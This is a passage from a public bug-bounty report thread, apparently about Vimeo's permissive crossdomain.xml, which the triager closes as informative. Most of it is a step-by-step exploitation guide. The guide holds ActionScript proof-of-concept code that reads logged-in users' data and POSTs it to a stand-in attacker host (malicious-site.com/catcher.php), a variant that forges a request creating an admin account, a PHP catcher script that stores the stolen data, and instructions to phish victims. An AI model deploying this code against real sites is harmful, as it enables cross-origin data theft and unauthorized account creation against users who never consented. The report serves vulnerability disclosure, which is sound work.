crossdomain.xml file, the application at \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is essentially opening the door to any malicious SWF loaded from anywhere on the web. For example, a SWF loaded from \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.malicious-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.malicious-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is now able to override/bypass Same Origin Policy and gain access to everything that the authorized user of \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e has access to. To say this in a different way, the overly permissive crossdomain.xml file allows Flash to do things that even JavaScript is not allowed to do, mainly accessing cross domain resources.\u003c/p\u003e\n\n\u003cp\u003eNote: The most permissive configuration option is the following line: \u0026lt;allow-access-from domain=\u0026quot;*\u0026quot;\u0026gt;. That is not the only overly permissive setting. Check out the reference papers listed above to find more.\u003c/p\u003e\n\n\u003cp\u003eNote: API sites that require a pre-shared key are an exception to the conditions listed above.  In this case, even when all three conditions are met, if \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e requires an API key or something similar to access the content, there is no risk. The attacker has no way of knowing the pre-shared secret API key, and therefore they can not forge a request with all of the required information to exploit the permissive crossdomain.xml.\u003c/p\u003e\n\n\u003cp\u003eNote: In my examples, I use www as the hostname (\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).  The security implications of the crossdomain.xml are specific to the fully qualified domain name, including hostname and/or subdomain if they are present.  For example, if the \u003ca title=\"https://www.secret-site.com/crossdomain.xml\" href=\"/redirect?url=https%3A%2F%2Fwww.secret-site.com%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.secret-site.com/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e contains \u0026lt;allow-access-from domain=\u0026quot;*\u0026quot;\u0026gt;, but all of the sensitive transactions happen on \u003ca title=\"https://secure.secret-site.com\" href=\"/redirect?url=https%3A%2F%2Fsecure.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, there is no risk.  Of course, if \u003ca title=\"https://secure.secret-site.com/crossdomain.xml\" href=\"/redirect?url=https%3A%2F%2Fsecure.secret-site.com%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.secret-site.com/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e exists and it also has an overly permissive policy, then we are back in business.  \u003c/p\u003e\n\n\u003ch1 id=\"exploitation\"\u003eExploitation\u003c/h1\u003e\n\n\u003cp\u003eAnd now the fun part. For the demo, I’m using Kali Linux. If you want to take advantage of the vulnerability described above, you need to modify and compile a SWF and host it on a web server.  The steps below show you how to do that, from start to finish. \u003c/p\u003e\n\n\u003ch1 id=\"1-install-adobe-flex\"\u003e1) Install Adobe Flex:\u003c/h1\u003e\n\n\u003cp\u003eapt-get install openjdk-6-jdk\u003cbr\u003e\n mkdir /opt/flex \u003cbr\u003e\n cd /opt/flex/ \u003cbr\u003e\n wget \u003ca title=\"http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip\" href=\"/redirect?url=http%3A%2F%2Fdownload.macromedia.com%2Fpub%2Fflex%2Fsdk%2Fflex_sdk_4.6.zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n unzip flex_sdk_4.6.zip \u003cbr\u003e\n chmod -R a+rx /opt/flex/\u003cbr\u003e\n echo \u0026#39;export PATH=/opt/flex/bin:$PATH\u0026#39; \u0026gt;\u0026gt; ~/.bashrc\u003c/p\u003e\n\n\u003ch1 id=\"chmod-755-bin-mxmlc\"\u003e chmod 755 bin/mxmlc\u003c/h1\u003e\n\n\u003ch1 id=\"2-download-gursev-s-exploit-code-the-as-and-the-html-files-from-github-or-copy-paste-from-his-blog-in-either-case-you-want-to-save-the-html-into-the-web-root-var-www-crossdomain-xdx-html-and-the-as-file-in-a-working-folder-outside-of-your-web-root-crossdomain-xdomainxploit-as\"\u003e2) Download Gursev’s exploit code (the .as and the .html files) from GitHub or copy/paste from his blog. In either case, you want to save the HTML into the web root (/var/www/crossdomain/xdx.html), and the AS file in a working folder outside of your web root (~/crossdomain/XDomainXploit.as) \u003c/h1\u003e\n\n\u003cp\u003emkdir /var/www/crossdomain\u003cbr\u003e\n mkdir ~/crossdomain\u003cbr\u003e\n cd ~\u003cbr\u003e\n git clone \u003ca title=\"https://github.com/gursev/flash-xdomain-xploit.git\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgursev%2Fflash-xdomain-xploit.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/gursev/flash-xdomain-xploit.git\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n cp flash-xdomain-xploit/xdx.html /var/www/crossdomain/\u003cbr\u003e\n cp flash-xdomain-xploit/XDomainXploit.as ~/crossdomain/\u003c/p\u003e\n\n\u003ch1 id=\"vi-crossdomain-xdomainxploit-as\"\u003e vi ~/crossdomain/XDomainXploit.as\u003c/h1\u003e\n\n\u003ch1 id=\"if-for-some-reason-you-don-t-have-the-git-client-or-the-git-command-in-the-previous-box-doesn-t-work-you-can-use-wget\"\u003eIf for some reason you don\u0026#39;t have the git client or the git command in the previous box doesn\u0026#39;t work, you can use wget:\u003c/h1\u003e\n\n\u003cp\u003ecd /var/www/crossdomain\u003cbr\u003e\n wget \u003ca title=\"https://raw.github.com/gursev/flash-xdomain-xploit/master/xdx.html\" href=\"/redirect?url=https%3A%2F%2Fraw.github.com%2Fgursev%2Fflash-xdomain-xploit%2Fmaster%2Fxdx.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.github.com/gursev/flash-xdomain-xploit/master/xdx.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\u003cbr\u003e\n cd ~/crossdomain\u003cbr\u003e\n wget \u003ca title=\"https://raw.github.com/gursev/flash-xdomain-xploit/master/XDomainXploit.as\" href=\"/redirect?url=https%3A%2F%2Fraw.github.com%2Fgursev%2Fflash-xdomain-xploit%2Fmaster%2FXDomainXploit.as\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.github.com/gursev/flash-xdomain-xploit/master/XDomainXploit.as\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"vi-crossdomain-xdomainxploit-as\"\u003e vi ~/crossdomain/XDomainXploit.as\u003c/h1\u003e\n\n\u003ch1 id=\"3-modify-the-actionscript-file-to-fit-your-needs-to-make-a-basic-get-request-gursev-s-comments-are-self-explanatory-you-just-replace-the-victim-url-and-the-attacker-url-my-changes-are-highlighted-in-yellow\"\u003e3) Modify the ActionScript file to fit your needs. To make a basic GET request, Gursev\u0026#39;s comments are self explanatory. You just replace the victim URL and the attacker URL.  My changes are highlighted in yellow.\u003c/h1\u003e\n\n\u003cp\u003e// POC Author: Gursev Singh Kalra (\u003ca title=\"gursev.kalra@foundstone.com\" href=\"mailto:gursev.kalra@foundstone.com\" rel=\"nofollow noopener noreferrer\"\u003egursev.kalra@foundstone.com\u003c/a\u003e)\u003cbr\u003e\n// XDomainXploit.as\u003c/p\u003e\n\n\u003cp\u003epackage {\u003cbr\u003e\n import flash.display.Sprite;\u003cbr\u003e\n import flash.events.*;\u003cbr\u003e\n import flash.net.URLRequestMethod;\u003cbr\u003e\n import flash.net.URLRequest;\u003cbr\u003e\n import flash.net.URLLoader;\u003c/p\u003e\n\n\u003cp\u003epublic class XDomainXploit extends Sprite {\u003cbr\u003e\n  public function XDomainXploit() {\u003cbr\u003e\n   // Target URL from where the data is to be retrieved\u003cbr\u003e\n   var readFrom:String = \u0026quot;\u003ca title=\"http://www.secret-site.com/account/info\" href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com%2Faccount%2Finfo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.secret-site.com/account/info\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;;\u003cbr\u003e\n   var readRequest:URLRequest = new URLRequest(readFrom);\u003cbr\u003e\n   var getLoader:URLLoader = new URLLoader();\u003cbr\u003e\n   getLoader.addEventListener(Event.COMPLETE, eventHandler);\u003cbr\u003e\n   try {\u003cbr\u003e\n    getLoader.load(readRequest);\u003cbr\u003e\n   } catch (error:Error) {\u003cbr\u003e\n    trace(\u0026quot;Error loading URL: \u0026quot; + error);\u003cbr\u003e\n   }\u003cbr\u003e\n  }\u003c/p\u003e\n\n\u003cp\u003eprivate function eventHandler(event:Event):void {\u003cbr\u003e\n   // URL to which retrieved data is to be sent\u003cbr\u003e\n   var sendTo:String = \u0026quot;\u003ca title=\"http://malicious-site.com/catcher.php\" href=\"/redirect?url=http%3A%2F%2Fmalicious-site.com%2Fcatcher.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://malicious-site.com/catcher.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003cbr\u003e\n   var sendRequest:URLRequest = new URLRequest(sendTo);\u003cbr\u003e\n   sendRequest.method = URLRequestMethod.POST;\u003cbr\u003e\n   sendRequest.data = event.target.data;\u003cbr\u003e\n   var sendLoader:URLLoader = new URLLoader();\u003cbr\u003e\n   try {\u003cbr\u003e\n    sendLoader.load(sendRequest);\u003cbr\u003e\n   } catch (error:Error) {\u003cbr\u003e\n    trace(\u0026quot;Error loading URL: \u0026quot; + error);\u003cbr\u003e\n   }\u003cbr\u003e\n  }\u003cbr\u003e\n }\u003c/p\u003e\n\n\u003ch1 id=\"part-2b622\"\u003e}\u003c/h1\u003e\n\n\u003ch1 id=\"if-you-want-to-have-the-swf-make-a-post-request-of-if-you-need-to-set-a-http-header-you-can-use-my-example-below\"\u003eIf you want to have the SWF make a POST request, of if you need to set a HTTP header, you can use my example below:\u003c/h1\u003e\n\n\u003cp\u003e// POC Author: Gursev Singh Kalra (\u003ca title=\"gursev.kalra@foundstone.com\" href=\"mailto:gursev.kalra@foundstone.com\" rel=\"nofollow noopener noreferrer\"\u003egursev.kalra@foundstone.com\u003c/a\u003e)\u003cbr\u003e\n// POC Modified to send POSTs and append HTTP headers: Seth Art\u003cbr\u003e\n// XDomainXploit.as\u003c/p\u003e\n\n\u003cp\u003epackage {\u003cbr\u003e\n import flash.display.Sprite;\u003cbr\u003e\n import flash.events.*;\u003cbr\u003e\n import flash.net.URLRequestMethod;\u003cbr\u003e\n import flash.net.URLRequest;\u003cbr\u003e\n import flash.net.URLLoader;\u003cbr\u003e\n import flash.net.URLRequestHeader;\u003cbr\u003e\n public class XDomainXploit3 extends Sprite {\u003cbr\u003e\n  public function XDomainXploit3() {\u003cbr\u003e\n   // Target URL from where the data is to be retrieved\u003cbr\u003e\n   var readFrom:String = \u0026quot;\u003ca title=\"https://www.secret-site.com/admin/add\" href=\"/redirect?url=https%3A%2F%2Fwww.secret-site.com%2Fadmin%2Fadd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.secret-site.com/admin/add\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;;\u003cbr\u003e\n   var header:URLRequestHeader = new URLRequestHeader(\u0026quot;Content-Type\u0026quot;, \u0026quot;text/plain; charset=UTF-8\u0026quot;);\u003cbr\u003e\n   var readRequest:URLRequest = new URLRequest(readFrom);\u003cbr\u003e\n   readRequest.method = URLRequestMethod.POST\u003cbr\u003e\n   readRequest.data = \u0026quot;{\\\u0026quot;name\\\u0026quot;:\\\u0026quot;CSRF-Admin\\\u0026quot;,\\\u0026quot;Group\\\u0026quot;:\\\u0026quot;admin\\\u0026quot;,\\\u0026quot;password\\\u0026quot;:\\\u0026quot;password\\\u0026quot;,\\\u0026quot;confirmPassword\\\u0026quot;:\\\u0026quot;password\\\u0026quot;}\u0026quot;;\u003cbr\u003e\n   readRequest.requestHeaders.push(header);\u003cbr\u003e\n   var getLoader:URLLoader = new URLLoader();\u003cbr\u003e\n   getLoader.addEventListener(Event.COMPLETE, eventHandler);\u003cbr\u003e\n   try {\u003cbr\u003e\n    getLoader.load(readRequest);\u003cbr\u003e\n   } catch (error:Error) {\u003cbr\u003e\n    trace(\u0026quot;Error loading URL: \u0026quot; + error);\u003cbr\u003e\n   }\u003cbr\u003e\n  }\u003c/p\u003e\n\n\u003cp\u003eprivate function eventHandler(event:Event):void {\u003cbr\u003e\n   // URL to which retrieved data is to be sent\u003cbr\u003e\n   var sendTo:String = \u0026quot;\u003ca title=\"http://www.malicious-site.com/crossdomain/catcher.php\" href=\"/redirect?url=http%3A%2F%2Fwww.malicious-site.com%2Fcrossdomain%2Fcatcher.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.malicious-site.com/crossdomain/catcher.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003cbr\u003e\n   var sendRequest:URLRequest = new URLRequest(sendTo);\u003cbr\u003e\n   sendRequest.method = URLRequestMethod.POST;\u003cbr\u003e\n   sendRequest.data = event.target.data;\u003cbr\u003e\n   var sendLoader:URLLoader = new URLLoader();\u003cbr\u003e\n   try {\u003cbr\u003e\n    sendLoader.load(sendRequest);\u003cbr\u003e\n   } catch (error:Error) {\u003cbr\u003e\n    trace(\u0026quot;Error loading URL: \u0026quot; + error);\u003cbr\u003e\n   }\u003cbr\u003e\n  }\u003cbr\u003e\n }\u003c/p\u003e\n\n\u003ch1 id=\"part-2b622\"\u003e}\u003c/h1\u003e\n\n\u003ch1 id=\"4-compile-the-actionscript-with-xmmlc\"\u003e4) Compile the ActionScript with xmmlc:\u003c/h1\u003e\n\n\u003ch1 id=\"opt-flex-bin-mxmlc-crossdomain-xdomainxploit-as\"\u003e /opt/flex/bin/mxmlc ~/crossdomain/XDomainXploit.as\u003c/h1\u003e\n\n\u003ch1 id=\"5-move-the-compiled-swf-somewhere-inside-your-web-root\"\u003e5) Move the compiled SWF somewhere inside your web root\u003c/h1\u003e\n\n\u003ch1 id=\"mv-crossdomain-xdomainxploit-swf-var-www-crossdomain\"\u003emv ~/crossdomain/XDomainXploit.swf /var/www/crossdomain\u003c/h1\u003e\n\n\u003ch1 id=\"6-create-and-save-the-catcher-file-this-php-file-takes-the-entire-data-portion-of-the-incoming-http-message-and-writes-it-to-a-file-in-tmp-you-can-get-a-lot-fancier-with-this-such-as-creating-a-separate-file-per-victim-or-by-parsing-the-file-within-php-and-only-writing-the-relevant-information-to-disk\"\u003e6) Create and save the catcher file. This php file takes the entire data portion of the incoming HTTP message and writes it to a file in /tmp. You can get a lot fancier with this, such as creating a separate file per victim, or by parsing the file within php and only writing the relevant information to disk.\u003c/h1\u003e\n\n\u003cp\u003evi /var/www/catcher.php\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;?php\u003c/p\u003e\n\n\u003cp\u003e$data = file_get_contents(\u0026quot;php://input\u0026quot;);\u003cbr\u003e\n$ret = file_put_contents(\u0026#39;/tmp/thanks_for_sharing.txt\u0026#39;, $data, FILE_APPEND | LOCK_EX);\u003cbr\u003e\nif($ret === false) {\u003cbr\u003e\n die(\u0026#39;Error writing to file\u0026#39;);\u003cbr\u003e\n}\u003cbr\u003e\nelse { \u003cbr\u003e\n echo \u0026quot;$ret bytes written to file\u0026quot;;\u003cbr\u003e\n}\u003c/p\u003e\n\n\u003ch1 id=\"part-310c89a3a0\"\u003e?\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"7-install-php-if-it-is-not-already-installed\"\u003e7) Install PHP if it is not already installed:\u003c/h1\u003e\n\n\u003ch1 id=\"apt-get-install-php5\"\u003e apt-get install php5\u003c/h1\u003e\n\n\u003ch1 id=\"8-set-your-web-server-to-support-ssl\"\u003e8) Set your web server to support SSL.\u003c/h1\u003e\n\n\u003cp\u003e*This step is optional, but if your flash object is communicating with a HTTPS site, and the secure=\u0026quot;false\u0026quot; attribute is not set, your flash object needs to have been loaded from a HTTPS site. \u003c/p\u003e\n\n\u003ch1 id=\"the-two-lines-below-show-you-how-to-make-a-self-signed-cert-http-charles-lescampeurs-org-2012-01-14-ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate-for-a-more-realistic-poc-you-would-want-to-purchase-a-valid-ssl-certificate-so-your-victim-user-does-not-get-any-ssl-errors\"\u003eThe two lines below show you how to make a self-signed cert(\u003ca title=\"http://charles.lescampeurs.org/2012/01/14/ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate\" href=\"/redirect?url=http%3A%2F%2Fcharles.lescampeurs.org%2F2012%2F01%2F14%2Fubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://charles.lescampeurs.org/2012/01/14/ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). For a more realistic POC, you would want to purchase a valid SSL certificate so your victim user does not get any SSL errors.\u003c/h1\u003e\n\n\u003cp\u003emake-ssl-cert generate-default-snakeoil --force-overwrite\u003cbr\u003e\n a2enmod ssl\u003c/p\u003e\n\n\u003ch1 id=\"a2ensite-default-ssl\"\u003e a2ensite default-ssl\u003c/h1\u003e\n\n\u003ch1 id=\"9-start-or-restart-your-web-server\"\u003e9) Start [or restart] your web server\u003c/h1\u003e\n\n\u003ch1 id=\"etc-init-d-apache2-restart\"\u003e /etc/init.d/apache2 restart\u003c/h1\u003e\n\n\u003cp\u003e10) Phish your victim to your site, \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.malicious-site.com%2Fcrossdomain%2Fxdx.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.malicious-site.com/crossdomain/xdx.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e11) Hope the victim is currently logged in to the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e12) Collect and analyze your stolen data:\u003c/p\u003e\n\n\u003cp\u003ecat /tmp/thanks_for_sharing.txt\u003c/p\u003e\n\n\u003cp\u003e=====================================================================================\u003c/p\u003e\n\n\u003ch1 id=\"pls-read-this-following-articles-for-more-information\"\u003ePls Read this following Articles for more Information : \u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"http://sethsec.blogspot.in/2014/07/crossdomain-bing.html\" href=\"/redirect?url=http%3A%2F%2Fsethsec.blogspot.in%2F2014%2F07%2Fcrossdomain-bing.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://sethsec.blogspot.in/2014/07/crossdomain-bing.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html\" href=\"/redirect?url=http%3A%2F%2Fgursevkalra.blogspot.in%2F2013%2F08%2Fbypassing-same-origin-policy-with-flash.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://sethsec.blogspot.in/2014/11/crossdomainxml-can-be-overly-permissive_18.html?view=sidebar\" href=\"/redirect?url=http%3A%2F%2Fsethsec.blogspot.in%2F2014%2F11%2Fcrossdomainxml-can-be-overly-permissive_18.html%3Fview%3Dsidebar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://sethsec.blogspot.in/2014/11/crossdomainxml-can-be-overly-permissive_18.html?view=sidebar\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-09T05:53:24.570Z","updated_at":"2015-01-09T05:53:24.570Z","actor":{"username":"balag_py","cleared":false,"url":"/balag_py","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/474/7b3bbf3c1bbc928e9b4154cc335bf1e42edbc0ac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":307321,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"See auto-response.","markdown_message":"\u003cp\u003eSee auto-response.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-09T20:49:23.218Z","updated_at":"2015-01-09T20:49:23.218Z","actor":{"username":"andrewp","cleared":false,"url":"/andrewp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/966/b9d700976d0952781d36b6dbd46cb36c8ec59da9_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":307976,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Dear  Sir,\n\nIts exploitable . Pls check above my explain.\n\n\u003ccross-domain-policy\u003e\n\u003csite-control permitted-cross-domain-policies=\"by-content-type\"/\u003e\n\u003callow-access-from domain=\"*\" secure=\"false\"/\u003e\n\u003callow-http-request-headers-from domain=\"*\" headers=\"*\"/\u003e\n\u003c/cross-domain-policy\u003e\n\nRegards,\nBALAJI","markdown_message":"\u003cp\u003eDear  Sir,\u003c/p\u003e\n\n\u003cp\u003eIts exploitable . Pls check above my explain.\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;cross-domain-policy\u0026gt;\u003cbr\u003e\n\u0026lt;site-control permitted-cross-domain-policies=\u0026quot;by-content-type\u0026quot;/\u0026gt;\u003cbr\u003e\n\u0026lt;allow-access-from domain=\u0026quot;*\u0026quot; secure=\u0026quot;false\u0026quot;/\u0026gt;\u003cbr\u003e\n\u0026lt;allow-http-request-headers-from domain=\u0026quot;*\u0026quot; headers=\u0026quot;*\u0026quot;/\u0026gt;\u003cbr\u003e\n\u0026lt;/cross-domain-policy\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nBALAJI\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-10T17:31:35.283Z","updated_at":"2015-01-10T17:31:35.283Z","first_to_agree":true,"actor":{"username":"balag_py","cleared":false,"url":"/balag_py","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/474/7b3bbf3c1bbc928e9b4154cc335bf1e42edbc0ac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":328413,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-09T17:32:04.799Z","updated_at":"2015-02-09T17:32:04.799Z","actor":{"url":"/vimeo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vimeo"}},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":328416,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"oh..!\n","markdown_message":"\u003cp\u003eoh..!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-09T17:33:29.952Z","updated_at":"2015-02-09T17:33:29.952Z","actor":{"username":"balag_py","cleared":false,"url":"/balag_py","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/474/7b3bbf3c1bbc928e9b4154cc335bf1e42edbc0ac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}